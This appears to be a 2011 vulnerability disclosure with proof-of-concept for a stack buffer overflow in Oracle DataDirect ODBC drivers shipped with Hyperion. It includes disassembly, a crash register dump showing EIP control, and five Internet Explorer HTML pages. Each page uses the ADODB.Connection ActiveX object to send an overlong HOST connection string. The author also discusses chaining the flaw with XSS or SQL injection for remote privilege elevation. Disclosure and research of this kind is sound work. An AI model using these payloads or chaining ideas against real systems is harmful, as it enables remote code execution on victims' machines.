@@ -1,0 +1,149 @@
+Oracle DataDirect Multiple Native Wire Protocol ODBC Drivers
+HOST Attribute Stack Based Buffer Overflow Vulnerability
+
+tested against: Microsoft Windows 2k3 r2 sp2
+                Oracle Hyperion Performance Management and BI (v11.1.2.1.0)
+
+download url of the Oracle Hyperion suite:
+http://www.oracle.com/technetwork/middleware/epm/downloads/index.html
+
+files tested:
+SystemInstaller-11121-win32.zip
+FoundationServices-11121-win32-Part1.zip
+FoundationServices-11121-win32-Part2.zip
+FoundationServices-11121-win32-Part3.zip
+FoundationServices-11121-win32-Part4.zip
+FoundationServices-11121-Part5.zip
+FoundationServices-11121-Part6.zip
+FoundationServices-11121-Part7.zip
+StaticContent-11121.zip
+RandAFoundation-11121.zip
+EPM_Architect-11121.zip
+
+Vulnerability:
+
+The mentioned product installs various drivers to allow
+the software to get informations from ODBC data sources.
+Some of them are vulnerable to a remote stack based buffer 
+overflow which can be triggered by specifying an overlong
+HOST attribute inside the connection string. The software
+tries to do an unicode/ASCII conversion. 
+In doing this, the stack is completely smashed
+allowing to redirect the execution flow to an user supplied buffer.
+
+Analysis for (*) and errata corrige, too many nights awake :
+When receiveng the attribute, arsqls24.dll 
+does an unicode/ASCII conversion; this fragment of code
+counts the number of bytes needed and store it in eax
+...
+01D45C10   83C1 02          add ecx,2
+01D45C13   83C0 01          add eax,1
+01D45C16   66:8339 00       cmp word ptr ds:[ecx],0
+01D45C1A  ^75 F4            jnz short ARSQLS24.01D45C10
+...
+the next operation is a copy loop which moves the needed
+bytes to a memory region pointed by ecx, trusting the 
+eax counter.
+...
+01D48C36   8A16             mov dl,byte ptr ds:[esi]
+01D48C38   83E8 01          sub eax,1
+01D48C3B   8811             mov byte ptr ds:[ecx],dl
+01D48C3D   83C1 01          add ecx,1
+01D48C40   83C6 02          add esi,2
+01D48C43   85C0             test eax,eax
+01D48C45  ^75 EF            jnz short ARSQLS24.01D48C36
+...
+The memory region pointed by ecx is adjacent to critical
+structures (stack pointers), so when the HOST attribute
+is an overlong string the stack is partially overwritten
+with user supplied values. The result, after a few steps:
+
+EAX FFFFFFFF
+ECX 00000003
+EDX 02B52E88
+EBX 0013C720 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ESP 0013C720 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+EBP 0013D1A4
+ESI 02B56FF8
+EDI 00000001
+EIP 41414141
+C 0  ES 0023 32bit 0(FFFFFFFF)
+P 1  CS 001B 32bit 0(FFFFFFFF)
+A 0  SS 0023 32bit 0(FFFFFFFF)
+Z 0  DS 0023 32bit 0(FFFFFFFF)
+S 0  FS 003B 32bit 7FFDF000(FFF)
+T 0  GS 0000 NULL
+D 0
+O 0  LastErr WSAHOST_NOT_FOUND (00002AF9)
+EFL 00010206 (NO,NB,NE,A,NS,PE,GE,G)
+MM0 0000 0000 0000 0000
+MM1 0000 0000 0000 0000
+MM2 0000 0000 0000 0000
+MM3 0000 0000 0000 0000
+MM4 0000 0000 0000 0000
+MM5 0000 0000 0000 0000
+MM6 8000 0000 0000 0000
+MM7 FEE0 0000 0000 0000
+
+poc:
+
+The underlying operating system contains the ADODB Connection
+ActiveX control which is marked safe for initialization
+and safe for scripting (implements the IObjectSafety interface)
+which could allow a remote attacker to specify the
+mentioned connection string. 
+
+The IE security settings do not allow to open a connection
+from another domain but this can be used in conjunction 
+with a XSS vulnerabilty, connection string pollution or 
+SQL injection vulnerabilities or through specific configuration
+files. Note also that I am mentioning the ADODB object for pure
+commodity: when installed, the ODBC drivers are availiable 
+systemwide, so this is a good basis for remote privilege elevations
+of many kinds. 
+
+Note that Internet Explorer does not crash when trying to
+execute EIP, attach a tool like faultmon to the IE sub-process.
+
+(*)
+<!-- saved from url=(0014)about:internet --> 
+<script>
+var obj = new ActiveXObject("ADODB.Connection");
+x=""; for (i=0;i<666;i++){x = x + "AAAA"}
+obj.ConnectionString ="DRIVER=DataDirect 6.0 SQL Server Native Wire Protocol;HOST=" + x + ";IP=127.0.0.1;PORT=9;DB=xxxxxx;UID=sa;PWD=null";
+obj.Open();
+</script>
+
+<!-- saved from url=(0014)about:internet --> 
+<script>
+var obj = new ActiveXObject("ADODB.Connection");
+x=""; for (i=0;i<1666;i++){x = x + "AAAA"}
+obj.ConnectionString ="DRIVER=DataDirect 6.0 Greenplum Wire Protocol;HOST=" + x + ";IP=127.0.0.1;PORT=9;DB=DB2DATA;UID=sa;PWD=null";
+obj.Open();
+</script>
+
+<!-- saved from url=(0014)about:internet --> 
+<script>
+var obj = new ActiveXObject("ADODB.Connection");
+x=""; for (i=0;i<1666;i++){x = x + "AAAA"}
+obj.ConnectionString ="DRIVER=DataDirect 6.0 Informix Wire Protocol;HOST=" + x + ";IP=127.0.0.1;PORT=9;DB=DB2DATA;UID=sa;PWD=null";
+obj.Open();
+</script>
+
+<!-- saved from url=(0014)about:internet --> 
+<script>
+var obj = new ActiveXObject("ADODB.Connection");
+x=""; for (i=0;i<1666;i++){x = x + "AAAA"}
+obj.ConnectionString ="DRIVER=DataDirect 6.0 PostgreSQL Wire Protocol;HOST=" + x +";UID=system;PWD=XXXXXXXXX;";
+obj.Open();
+</script>
+
+<!-- saved from url=(0014)about:internet --> 
+<script>
+var obj = new ActiveXObject("ADODB.Connection");
+x=""; for (i=0;i<700;i++){x = x + "AAAA"}
+obj.ConnectionString ="DRIVER=DataDirect 6.0 MySQL Wire Protocol;HOST=" + x + ";IP=127.0.0.1;PORT=9;DB=DB2DATA;UID=sa;PWD=null";
+obj.Open();
+</script>
+
+//0.07 20/10/2011 - rgod
